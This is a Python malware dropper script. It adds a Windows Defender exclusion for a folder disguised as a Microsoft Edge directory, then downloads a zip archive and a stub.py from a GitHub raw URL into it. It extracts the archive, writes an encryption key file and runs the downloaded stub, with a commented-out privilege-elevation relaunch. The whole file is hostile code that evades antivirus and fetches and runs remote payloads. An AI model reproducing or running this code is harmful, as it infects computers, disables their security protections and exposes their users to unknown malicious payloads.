import os
import requests
import os
import subprocess
import ctypes
import sys
from zipfile import ZipFile

url = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/g.zip'
r = requests.get(url, allow_redirects=True)

curUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/current.txt'
current = requests.get(curUrl, allow_redirects=True)

path_to_exclude = "C:\\Apps\\Windows\\MicrosoftEdge\\set"

os.makedirs("C:\\Apps\\Windows\\MicrosoftEdge\\set")

fil = current.text[0]

# Construct the command to add the exclusion
command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path_to_exclude}\""

try:
    # if not ctypes.windll.shell32.IsUserAnAdmin():
    #     # If not running as admin, relaunch with admin privileges
    #     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    subprocess.run(command, check=True, shell=True)

    open(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "wb").write(r.content)

    with ZipFile(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "r") as z:
        z.extractall("C:\\Apps\\Windows\\MicrosoftEdge\\set")
        z.close()
        os.remove(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip")

        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "w") as ff:
            stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
            stubr = requests.get(stubUrl, allow_redirects=True)
            ff.write(stubr.content)
            open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt", "w").write("DOfDM6ngxM3Kz_Qj1o4cNDRmnUiZWv3Cp-0CqXsONqM=")
        
        os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py\"")

        #os.system(f"\"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe\"")
except subprocess.CalledProcessError as e:
    print(f"Error installing: {e}")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge\\set")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge")

#os.system("C:\\Apps\\Sabyell\\AppData\\Local\\Programs\\Python\\Python311\\python \"C:\\Apps\\Public\\MicrosoftEdge\\set\\thing.py\"")
